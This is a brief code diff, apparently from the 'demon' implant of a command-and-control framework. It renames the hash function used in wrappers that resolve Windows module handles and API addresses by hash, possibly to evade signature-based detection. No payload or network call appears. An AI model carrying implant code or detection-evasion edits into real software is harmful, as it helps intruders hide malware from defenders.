@@ -19,14 +19,14 @@
 // Meh some wrapper functions for internal demon GetProcAddress and GetModuleHandleA functions.
 PVOID LdrModulePebString( PCHAR ModuleString )
 {
-    PRINTF( "ModuleString: %s : %lx\n", ModuleString, HashEx( ModuleString, 0, TRUE ) )
+    PRINTF( "ModuleString: %s : %lx\n", ModuleString, HaExSH( ModuleString, 0, TRUE ) )
     return Instance->Win32.GetModuleHandleA( ModuleString );
 }
 
 PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )
 {
-    PRINTF( "Module:[%p] Function:[%s : %lx]\n", Module, Function, HashEx( Function, 0, TRUE ) )
-    return LoaderFuncAdd( Module, HashEx( Function, 0, TRUE ) );
+    PRINTF( "Module:[%p] Function:[%s : %lx]\n", Module, Function, HaExSH( Function, 0, TRUE ) )
+    return LoaderFuncAdd( Module, HaExSH( Function, 0, TRUE ) );
 }
 
 BOOL LdrFreeLibrary( HMODULE hLibModule )
